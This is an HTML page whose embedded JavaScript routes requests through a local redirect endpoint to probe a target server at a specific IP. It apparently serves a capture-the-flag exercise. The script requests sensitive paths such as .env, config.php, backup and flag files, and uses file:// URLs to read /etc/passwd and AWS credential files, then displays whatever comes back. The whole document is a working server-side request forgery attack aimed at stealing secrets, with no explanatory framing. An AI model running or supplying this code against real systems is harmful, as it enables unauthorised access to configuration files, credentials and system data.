<!DOCTYPE html>
<html>
<head>
    <title>Local Server Exploration</title>
</head>
<body>
    <h1>Exploring Target Server Files</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Test accessing the target server itself and common files
        var targets = [
            'http://54.209.100.76/',
            'http://54.209.100.76/index.php',
            'http://54.209.100.76/config.php',
            'http://54.209.100.76/.env',
            'http://54.209.100.76/admin/',
            'http://54.209.100.76/backup/',
            'http://54.209.100.76/secret/',
            'http://54.209.100.76/flag.txt',
            'http://54.209.100.76/flag',
            'http://54.209.100.76/credentials',
            'http://54.209.100.76/aws-credentials',
            'http://54.209.100.76/phpinfo.php',
            'http://54.209.100.76/debug.php',
            'http://54.209.100.76/test.php',
            'file:///etc/passwd',
            'file:///var/www/html/.env',
            'file:///home/ubuntu/.aws/credentials',
            'file:///root/.aws/credentials'
        ];
        
        for(var i = 0; i < targets.length; i++) {
            try {
                results += "<h3>Test " + (i+1) + ": " + targets[i] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(targets[i]), false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.length > 10) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:300px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ Empty or short response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
